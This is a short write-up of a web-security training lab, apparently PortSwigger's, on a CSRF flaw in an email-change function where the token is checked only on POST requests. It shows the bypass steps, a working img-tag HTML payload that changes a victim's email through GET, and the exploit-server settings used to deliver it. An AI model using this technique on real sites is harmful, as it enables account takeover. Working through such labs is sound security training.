### Lab: CSRF where token validation depends on request method

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

_____

Analysis and Exploit:

1. Logged-in as user _wiener_ and tested the 'change-email' functionality.  
On POST request the required parameters are _email_ (email address to set as the new email) and _csrf_ (which contains a random csrf token).

2. Through [BURP REPEATER] changed the request method from POST to GET and removed the _csrf_ parameter from the URL and it worked.
Since the CSRF protection for the funcionality is implemented only on requests made using the POST method, setting the new email using the GET method bypass the protection.

3. On exploit-server, stored and delivered the payload*:
```html
<html>
<body>
<img src="https://0a68008a048967758029fd920081006d.web-security-academy.net/my-account/change-email?email=victim%40gothacked" onerror=alert(1)>
</body>
</html>
```


_____

Script notes:

- 2 - Payload: **GET** /my-account/change-email?email=testgetmethod%40test 

- 3 - Store and deliver payload to victim, params:
    - urlIsHttps: on
    - responseFile: /exploit
    - responseHead: HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8
    - responseBody: *
    - formAction: STORE | DELIVER_TO_VICTIM

